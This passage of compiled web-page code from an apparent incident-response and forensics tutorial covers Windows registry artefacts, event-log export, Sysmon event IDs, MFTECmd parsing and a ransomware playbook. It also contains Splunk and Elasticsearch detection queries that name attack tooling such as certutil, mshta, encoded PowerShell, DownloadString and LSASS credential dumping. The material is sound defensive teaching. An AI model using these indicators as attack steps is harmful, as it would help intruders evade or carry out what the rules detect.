          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Service configuration, could be malware"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "SYSTEM\\CurrentControlSet\\Control\\DeviceClasses\\"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "USB device history"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Connected USB storage devices"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "SYSTEM\\CurrentControlSet\\Enum\\USBSTOR"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "USB storage devices"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Detailed USB device information"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "SAM\\SAM\\Domains\\Account\\Users"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "User accounts"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "User information, last logon, password hashes"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "NTUSER.DAT\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\MountPoints2"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Mapped drives"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Network share access"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "106-windows-event-log-analysis",
      children: "10.6 Windows Event Log Analysis"
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Real-World Analogy:"
      }), " A flight data recorder (black box) on an airplane records every button press, every system message, and every alert. Windows Event Logs are the flight data recorder for a computer. They record every login (takeoff), failed attempt (rough landing), service start (engine ignition), and application crash (turbulence)."]
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-bash",
        children: "# Using wevtutil (native Windows)\n# Export specific event logs\nwevtutil epl Security C:\\evidence\\Security.evtx\nwevtutil epl System C:\\evidence\\System.evtx\nwevtutil epl Application C:\\evidence\\Application.evtx\nwevtutil epl \"Windows PowerShell\" C:\\evidence\\PowerShell.evtx\nwevtutil epl \"Microsoft-Windows-Sysmon/Operational\" C:\\evidence\\Sysmon.evtx\n\n# Query specific event IDs\nwevtutil qe Security /q:\"Event[System[(EventID=4624)]]\" /c:100 /f:text\n\n# Using PowerShell\n# Get log file info\nGet-WmiObject -Class Win32_NTEventlogFile | Select-Object LogFileName, FileSize\n\n# Export with PowerShell\nGet-WinEvent -LogName Security | Export-Csv -Path security_events.csv -NoTypeInformation\n\n# python-evtx → parse EVTX files\npython3 -c \"\nimport evtx\nwith evtx.Evtx('Security.evtx') as log:\n    for record in log.records():\n        xml = record.xml()\n        print(xml[:500])\n        print('---')\n\"\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Critical Windows Event IDs for IR:"
      })
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "Event ID"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Description"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Source"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Forensic Significance"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "4624"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Successful logon"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Security"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "User authentication, lateral movement"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "4625"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Failed logon"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Security"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Brute force, password guessing"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "4634"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Logoff"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Security"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Session end time"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "4648"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Logon with explicit credentials"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Security"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "RunAs, scheduled task execution"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "4672"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Admin logon (special privileges)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Security"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Privileged account usage"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "4688"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Process creation"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Security"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Malware execution, command-line arguments"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "4689"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Process exit"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Security"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Process termination"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "4697"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Service installed"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Security"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Malware persistence"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "4700"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Task scheduled"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Security"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Malware scheduled task"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "4720"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "User account created"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Security"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Backdoor account creation"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "4726"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "User account deleted"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Security"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Evidence tampering"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "4732"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "User added to security group"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Security"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Privilege escalation"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "4776"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Credential validation"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Security"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Domain authentication attempts"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "5140"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "SMB share accessed"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Security"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Lateral movement via file shares"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "5156"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Network connection allowed"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Security"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Outbound/inbound connections"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "7045"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Service installed (System)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "System"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Malware service installation"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "1"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Process creation (Sysmon)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Sysmon"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Detailed process creation with hash"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "3"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Network connection (Sysmon)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Sysmon"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Detailed network connections"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "7"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "DLL loaded (Sysmon)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Sysmon"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "DLL injection detection"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "8"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "CreateRemoteThread (Sysmon)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Sysmon"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Process injection detection"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "10"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Process access (Sysmon)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Sysmon"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Lsass access (credential dumping)"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "11"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "File creation (Sysmon)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Sysmon"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Malware file creation"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "13"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Registry value set (Sysmon)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Sysmon"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Persistence via registry"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "15"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "File stream (Sysmon)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Sysmon"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Alternate data stream creation"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "22"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "DNS query (Sysmon)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Sysmon"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "C2 domain lookups"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "4103"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "PowerShell pipeline execution"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "PowerShell"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "PowerShell command execution"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "4104"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "PowerShell script block logging"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "PowerShell"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Full script content (if enabled)"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Splunk Queries for SOC Analysis:"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-spl",
        children: "# Suspicious Process Creation\nindex=windows EventCode=4688\n| search New_Process_Name IN (\"*powershell*\", \"*cmd*\", \"*wscript*\", \"*cscript*\", \n                              \"*mshta*\", \"*regsvr32*\", \"*rundll32*\", \"*certutil*\")\n| rex field=CommandLine \"(?<cmd>[^\\\\\\]+(?=\\s|$))\"\n| stats count by User, New_Process_Name, cmd, ComputerName\n| sort - count\n| table User, New_Process_Name, cmd, ComputerName, count\n\n# Lateral Movement Detection (Event ID 4624 with explicit credentials)\nindex=windows EventCode=4648\n| search Target_Server_Name=*\n| stats count by Account_Name, Target_Server_Name, Process_Name, IpAddress\n| where count > 5\n| table Account_Name, Target_Server_Name, Process_Name, IpAddress, count\n\n# RDP Brute Force Detection\nindex=windows EventCode=4625 Logon_Type=10\n| stats count by Account_Name, Source_Network_Address\n| where count > 10\n| table Account_Name, Source_Network_Address, count\n\n# PowerShell Encoded Command Detection\nindex=windows (EventCode=4688 OR Source=\"WinEventLog:Microsoft-Windows-PowerShell/Operational\")\n| search \"-EncodedCommand\" OR \"-enc \" OR \"*DownloadString*\" OR \"*Invoke-Expression*\"\n| stats count by User, ComputerName, CommandLine\n| table User, ComputerName, CommandLine, count\n\n# Service Installation (Event ID 4697 / 7045)\nindex=windows (EventCode=4697 OR EventCode=7045)\n| search Service_Type IN (\"*kernel*\", \"*file system*\")\n    OR Service_Start_Name IN (\"*LocalSystem*\")\n    OR NOT Image_Path IN (\"C:\\\\Windows\\\\System32\\\\*\", \"C:\\\\Program Files\\\\*\")\n| table Time, ComputerName, Service_Name, Image_Path, Service_Start_Name\n\n# Failed Logins by Source IP\nindex=windows EventCode=4625\n| search Logon_Type=3\n| stats count by Source_Network_Address, Account_Name\n| where count > 50\n| table Source_Network_Address, Account_Name, count\n| sort - count\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "ELK (Elasticsearch) Queries for SOC Analysis:"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-json",
        children: "// Find Base64 encoded PowerShell commands\nGET /windows-logs-*/_search\n{\n  \"query\": {\n    \"bool\": {\n      \"must\": [\n        { \"match\": { \"EventID\": 4688 } },\n        { \"regexp\": { \"CommandLine\": \".*[A-Za-z0-9+/]{40,}==?.*\" } }\n      ]\n    }\n  },\n  \"size\": 50\n}\n\n// Detect network connections to known bad IPs\nGET /sysmon-logs-*/_search\n{\n  \"query\": {\n    \"terms\": {\n      \"DestinationIp\": [\n        \"185.234.72.18\",\n        \"198.51.100.50\",\n        \"203.0.113.0\"\n      ]\n    }\n  },\n  \"sort\": [ { \"@timestamp\": \"desc\" } ]\n}\n\n// Find DLL load events from suspicious locations\nGET /sysmon-logs-*/_search\n{\n  \"query\": {\n    \"bool\": {\n      \"must\": [\n        { \"match\": { \"EventID\": 7 } },\n        { \"wildcard\": { \"ImageLoaded\": \"*\\\\Temp\\\\*\" } }\n      ]\n    }\n  },\n  \"aggs\": {\n    \"by_process\": {\n      \"terms\": { \"field\": \"Image.keyword\", \"size\": 20 }\n    }\n  }\n}\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "107-mftecmd--mft-parsing",
      children: "10.7 MFTECmd → MFT Parsing"
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-powershell",
        children: "# Parse MFT file to CSV\nMFTECmd.exe -f \"C:\\evidence\\$MFT\" --csv \"C:\\evidence\\mft_output.csv\"\n\n# Parse with detailed information (bodyfile format)\nMFTECmd.exe -f \"C:\\evidence\\$MFT\" --body \"C:\\evidence\\mft_bodyfile.txt\" --bodyfull\n\n# Parse and include file content (SLACK space analysis)\nMFTECmd.exe -f \"C:\\evidence\\$MFT\" --csv \"C:\\evidence\\mft_output.csv\" --deleted\n\n# Filter by date range\nMFTECmd.exe -f \"C:\\evidence\\$MFT\" --csv \"C:\\evidence\\mft_output.csv\" --fndate \"2024-06-15\"\n\n# Find specific file\nMFTECmd.exe -f \"C:\\evidence\\$MFT\" --csv \"C:\\evidence\\mft_output.csv\" --fn \"beacon.dll\"\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "MFTECmd Output Fields:"
      })
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "Column"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Description"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Example"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "EntryNumber"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "MFT entry number"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "45"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "ParentEntryNumber"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Parent directory entry"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "5"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Name"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "File name"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Invoice_2024.docm"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Extension"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "File extension"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "docm"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Created0x10"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "$SI Creation time"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "2024-06-15 14:30:00"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Modified0x10"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "$SI Modified time"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "2024-06-15 14:30:05"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Created0x30"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "$FN Creation time"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "2024-06-15 14:30:00"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Modified0x30"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "$FN Modified time"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "2024-06-15 14:30:05"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "FileSize"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Size in bytes"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "124536"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Flags"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Entry flags"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "File, Deleted"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "IsDirectory"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Is directory flag"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "False"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "IsDeleted"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Deleted flag"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "True"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Slack"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Slack space in bytes"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "456"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Resident"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Data is resident in MFT"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "False"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "SequenceNumber"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Incremented on reuse"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "2"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "ParentName"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Parent directory name"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Downloads"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "108-incident-response-playbooks",
      children: "10.8 Incident Response Playbooks"
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Real-World Analogy:"
      }), " A pilot doesn't improvise when an engine fails mid-flight. They follow a laminated checklist: \"Engine failure after V1 → rotate, climb to 400 feet, contact ATC, run emergency checklist.\" IR playbooks are the same → they ensure critical steps are not missed under stress."]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Ransomware Playbook:"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        children: "╔════════════════════════════════════════════════════════════╗\n║          RANSOMWARE INCIDENT RESPONSE PLAYBOOK            ║\n║                Version 1.0 | IR-PB-001                    ║\n╚════════════════════════════════════════════════════════════╝\n\n1. DETECTION\n   □ Alert: Files being renamed to .encrypted, .locked, .crypted\n   □ Alert: Ransom note files (README.txt, HOW_TO_RECOVER.txt)\n   □ Alert: Mass file modification events (Sysmon ID 11)\n   □ Alert: User reporting \"files won't open\"\n\n2. TRIAGE (within 5 minutes)\n   □ Confirm ransomware variant (note text, extension)\n   □ Identify affected systems count\n   □ Check if encryption is still in progress\n   □ Check if backups are affected\n   □ Determine data criticality\n\n3. CONTAINMENT (within 15 minutes)\n   □ Isolate affected systems from network (pull cable, disable NIC)\n   □ Disable Active Directory accounts of affected users\n   □ Block ransomware C2 IPs at firewall\n   □ If ransomware is spreading via SMB: block SMB at switches\n   □ Disable any network shares that may propagate\n   □ Capture memory dumps from affected systems\n   □ Image affected hard drives (before reboot)\n\n4. ERADICATION (within 1 hour)\n   □ Identify patient-zero system\n   □ Determine infection vector (phish, RDP, VPN, etc.)\n   □ Remove ransomware from systems (safe mode scan, removal tool)\n   □ Or reimage affected systems from known-clean image\n   □ Change all domain passwords\n   □ Rotate all service account credentials\n   □ Apply necessary patches\n\n5. RECOVERY (within 24 hours)\n   □ Validate clean backups exist (not encrypted)\n   □ Restore critical systems from backup first\n   □ Scan restored files for malware before reconnecting\n   □ Restore less critical systems in phases\n   □ Monitor restored systems for signs of re-infection\n\n6. POST-INCIDENT (within 1 week)\n   □ Conduct root cause analysis\n   □ Update detection rules (YARA, SIEM)\n   □ Improve email filtering and web filtering\n   □ Implement AppLocker/Software Restriction Policies\n   □ Update backup strategy (immutable backups)\n\nSEVERITY: \n   □ 1 system affected → P3\n   □ 2-10 systems affected → P2\n   □ 10+ systems or critical server → P1\n   □ Data exfiltration detected → P1 + Legal\n\nDECISION POINTS:\n   □ Pay ransom? Yes / No (needs CEO + Board + Legal)\n   □ Contact law enforcement? Yes / No\n   □ Public disclosure? Yes / No\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Phishing Incident Playbook:"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
